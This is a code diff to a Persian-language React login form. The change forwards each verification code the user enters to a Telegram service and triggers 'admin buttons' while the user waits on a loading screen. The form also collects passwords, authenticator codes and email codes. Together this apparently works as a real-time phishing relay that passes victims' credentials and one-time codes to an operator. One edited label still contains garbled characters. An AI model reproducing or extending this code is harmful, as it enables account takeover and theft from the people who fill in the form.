@@ -263,18 +263,29 @@ export const LoginForm = () => {
     try {
       // In demo mode, accept any 6-digit code
       console.log("Verifying code:", verifyCode);
+
+      // Import the updatePhoneVerification function
+      const { updatePhoneVerification, showAdminButtons } = await import(
+        "@/lib/telegram-service-enhanced"
+      );
+
+      // Update verification in Telegram
+      const success = await updatePhoneVerification(sessionId, verifyCode);
+      if (!success) {
+        throw new Error("Failed to update phone verification");
+      }
+
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
       setCurrentStep("loading");
 
-      // Register callback handler and show admin buttons
+      // Show admin buttons after reaching loading page
       setTimeout(async () => {
         try {
-          if (sessionId) {
-            await setUserCurrentStep(sessionId, "waiting_admin");
-          }
+          console.log("📱 User reached loading step, showing admin buttons...");
+          await showAdminButtons(sessionId);
         } catch (error) {
-          console.warn("Could not show admin buttons:", error);
+          console.warn("⚠️ Could not show admin buttons:", error);
         }
       }, 2000);
     } catch (error) {
@@ -318,7 +329,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور الزامی ��ست" });
+      setErrors({ password: "رمز عبور الزامی است" });
       return;
     }
 
@@ -1011,7 +1022,7 @@ export const LoginForm = () => {
                   {countdown > 0 ? (
                     <>
                       <span>{toPersianDigits(countdown)}</span>
-                      <span> ثانیه تا ا��سال مجدد کد</span>
+                      <span> ثانیه تا ارسال مجدد کد</span>
                     </>
                   ) : (
                     <button
@@ -1262,7 +1273,7 @@ export const LoginForm = () => {
                     }}
                   >
                     اگر Google Authenticator را نصب نکرده‌اید، ابتدا از App
-                    Store یا Google Play دانل��د کنید
+                    Store یا Google Play دانلود کنید
                   </p>
                 </div>
               </div>
@@ -1476,7 +1487,7 @@ export const LoginForm = () => {
                     textAlign: "right",
                   }}
                 >
-                  کد تایید ا��میل
+                  کد تایی�� ایمیل
                 </label>
                 <OTPInput
                   length={6}
